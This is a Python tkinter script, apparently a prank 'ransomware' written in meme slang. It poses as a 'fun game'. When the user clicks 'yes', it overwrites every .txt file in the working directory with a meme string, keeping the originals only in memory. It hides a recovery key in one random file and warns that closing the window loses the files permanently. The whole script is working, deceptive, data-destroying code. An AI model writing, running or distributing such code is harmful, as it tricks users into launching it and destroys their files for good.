import os
import time
import random
import tkinter as tk

keygen = "abcdefghijklmnopqrstuvwxyz1234567890"
 
keyprint = []
for i in range(20):
  keyprint.append(keygen[random.randint(0,35)])
key = "".join(keyprint)
  
files = {}

class File:

  def __init__(self, contents):
    self.contents = contents
    if "sus amongus rizzler fanumtaxed ur gyattinfiles in ohio like an NPC" in self.contents :
      self.encrypted = True
      self.ogcontents = "I told u not to close the app!!! ur files are lost forever!!!"
    else:
      self.encrypted = False
      self.ogcontents = "ahhhhhhhhhhhhhhhhhhh"
      
  def encrypt(self):
    if self.encrypted:
      pass
    else:
      self.ogcontents = self.contents
      self.contents = "sus amongus rizzler fanumtaxed ur gyattinfiles in ohio like an NPC"
      self.encrypted = True

  def decrypt(self):
    if self.encrypted == False:
      pass
    else:
      self.contents = self.ogcontents
      self.ogontents = ""
      self.encrypted = False
#class ends

for archive in os.listdir():
  try:
    if archive != "sus.py":
      with open(archive, "r") as f:
        conty = f.read() 
      archive = File(conty)
  except IsADirectoryError:
    continue
  except UnicodeDecodeError:
    continue
  except PermissionError:
    continue
def sus():
  filect = 0
  for file in os.listdir():
    try:
      if file.endswith(".txt"):
        filect += 1
        with open(file, "r") as f:
          cont = f.read()
        files[file] = File(cont)
        files[file].encrypt()
        
        #files[file].contents = files[file].contents +"\n"+ key
        with open(file, "w") as g:
          g.write(files[file].contents)

    except IsADirectoryError:
      continue
    except PermissionError:
      continue
  rand = random.randint(1,filect)
  count = 0
  for fil in os.listdir():
    if os.path.isfile(fil) and fil.endswith(".txt"):
      count+=1
      if count == rand:
        with open(fil,"w") as yay:
          yay.write(files[fil].contents + "\n OMG u found the key! KEY: "+key)
          
def unsus():
  for life in os.listdir():
    try: 
      if life.endswith(".txt"):
        files[life].decrypt()
        with open(life, "w") as fs:
          fs.write(files[life].contents)
    except IsADirectoryError:
      pass
    except PermissionError:
      continue

bruh = False
def close():
  global bruh
  bruh = True
  sus()
  window.destroy()

sussify = False
def bunsus():
  global sussify
  ent = enty.get()
  if(ent == key):
    unsus() 
    sussify = True
    if sussify:
      win2.destroy()
      wi3 = tk.Tk()
      wi3.title("BACK!!")
      wi3.geometry("1000x200+300+300")
      li = tk.Label(text="UR FILES ARE OFFICIALY BACK (IF U FOLLOWED MY RULES)", font=("arial", 25, "bold"))
      li.pack()
      b = tk.Label(text="U may close this window now", font=("arial", 15, "bold"))
      b.pack()
      wi3.mainloop()
  else:
    fgg = tk.Label(text="U DONT EVEN HAVE A GYATT BRUH", font=("arial", 15, "bold"))
    fgg.pack()
window = tk.Tk()
window.geometry("400x100+600+300")
window.title("fun game")

lab = tk.Label(text="dO yOu WaNt To pLaY A fUn GamE riZZleR?")
lab.pack()
yes = tk.Button(text="yes :D", font="comic-sans", command=close)
yes.pack()
no = tk.Button(text="no :(", command=window.destroy)
no.pack()
window.mainloop() 

if bruh:
  win2 = tk.Tk()
  win2.geometry("800x400+400+150")
  win2.title("SusD3crypt0r")
  titles = tk.Label(text="Guess what RIZZly bear?", font=("comic-sans",30,"bold"))
  titles.pack()
  one = tk.Label(text="I fanumtaxed ur files in ohio!!!")
  two = tk.Label(text="what is fanumtax?")
  three = tk.Label(text="fanumtax is the gen alpha slang for STEAL!!")
  four = tk.Label(text="The only way u can get them back, is by finding a special recovery key within all ur files. ONLY ONE FILE WILL CONTAIN IT")
  five = tk.Label(text="ONE LAST RULE: if u close this app, u wont be able to recover ur files")
  six = tk.Label(text="well anyways: SEARCH!!!!!")
  seven = tk.Label(text="")
  bu = tk.Label(text="key:")
  enty = tk.Entry()
  decrypt = tk.Button(text="De-sus your files!", command=bunsus)
  one.pack()
  two.pack()
  three.pack()
  four.pack()
  five.pack()
  six.pack()
  seven.pack()
  bu.pack()
  enty.pack()
  decrypt.pack()
  win2.mainloop()